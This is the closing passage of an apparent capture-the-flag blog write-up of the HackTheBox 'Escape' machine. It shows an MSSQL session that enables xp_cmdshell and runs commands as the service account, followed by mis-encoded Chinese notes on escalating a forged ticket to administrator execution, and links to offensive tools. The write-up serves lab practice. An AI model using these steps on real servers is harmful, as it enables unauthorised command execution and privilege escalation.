<span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; RECONFIGURE</span><br><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span></span><br><span class="line">output</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">sequel\sql_svc</span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å‘½ä»¤ä»ç„¶ä½œä¸ºsql_svcèº«ä»½è¿è¡Œã€‚è¿™æ˜¯å› ä¸ºsql_svcä»ç„¶æ˜¯è¿è¡ŒMSSQLæœåŠ¡çš„è¿›ç¨‹ã€‚å®ƒåªèƒ½ä¸æ“ä½œç³»ç»Ÿåå•†ä»¥administratorèº«ä»½è¯»å–æ–‡ä»¶ï¼Œå› ä¸ºæœ‰é‚£ä¸ªç¥¨æ®ã€‚</p>
<p>ä½¿ç”¨administratorèº«ä»½è¯»å†™æ–‡ä»¶ï¼Œå¯ä»¥å°†å…¶è½¬æ¢ä¸ºadministratorèº«ä»½æ‰§è¡Œã€‚è¿™ä¸ª<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1dpbmRvd3MlMjAtJTIwUHJpdmlsZWdlJTIwRXNjYWxhdGlvbi5tZCNlb3AtLS1wcml2aWxlZ2VkLWZpbGUtd3JpdGU=">PayloadsAllTheThingsé¡µé¢<i class="fa fa-external-link-alt"></i></span>å±•ç¤ºäº†å„ç§æ–¹æ³•ã€‚HackBackä¸­å±•ç¤ºäº†<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE5LzA3LzA2L2h0Yi1oYWNrYmFjay5odG1sI2FyYml0cmFyeS13cml0ZS0tZGlhZ2h1Yi0tc3lzdGVt">DiagHubæ–¹æ³•<i class="fa fa-external-link-alt"></i></span>ï¼Œå°½ç®¡åæ¥æ‰“äº†è¡¥ä¸ã€‚åœ¨Properä¸­å±•ç¤ºäº†<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIxLzA4LzIxL2h0Yi1wcm9wZXIuaHRtbCNzaGVsbC12aWEtd2VydHJpZ2dlcg==">WerTriggeræ–¹æ³•<i class="fa fa-external-link-alt"></i></span>ï¼Œä»ç„¶æœ‰ç”¨ã€‚</p>
<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA2LzE3L2h0Yi1lc2NhcGUuaHRtbA==">0xdfâ€™s blog Escape walkthrough<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvRXNjYXBlL3dhbGt0aHJvdWdocw==">HTBâ€™s official Escape walkthrough<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xnYW5keC9SZXNwb25kZXI=">Responder<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL1NoYXJwQ29sbGVjdGlvbi90cmVlL21hc3Rlci9OZXRGcmFtZXdvcmtfNC43X0FueQ==">SharpCollection<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9DZXJ0aWZ5">Certify<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tMzY1aW50ZXJuYWxzLmNvbS8yMDIyLzExLzA3L2ludmVzdGlnYXRpbmctY2VydGlmaWNhdGUtdGVtcGxhdGUtZW5yb2xsbWVudC1hdHRhY2tzLWFkY3Mv">Investigating Certificate Template Enrollment Attacks â€“ (ADCS)<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">certipy<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cubmV0d3JpeC5jb20vc2lsdmVyX3RpY2tldF9hdHRhY2tfZm9yZ2VkX3NlcnZpY2VfdGlja2V0cy5odG1s">Silver Ticket Attack<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDEx">How Attackers Use Kerberos Silver Tickets to Exploit Systems<i class="fa fa-external-link-alt"></i></span></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2023/06/18/escape/" title="HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket]">https://fdlucifer.github.io/2023/06/18/escape/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/05/29/htb-absolute/" rel="prev" title="HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]">
                  <i class="fa fa-chevron-left"></i> HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/06/29/ciscn-2022-ezpentest/" rel="next" title="ciscn 2022 ezpentest writeup [sql BIGINTç›²æ³¨ç»•æ­£åˆ™+è§£phpjiamiæ··æ·†+ååºåˆ—åŒ–POPé“¾æ„é€ ]">
                  ciscn 2022 ezpentest writeup [sql BIGINTç›²æ³¨ç»•æ­£åˆ™+è§£phpjiamiæ··æ·†+ååºåˆ—åŒ–POPé“¾æ„é€ ] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 â€“ 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">643k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:57</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
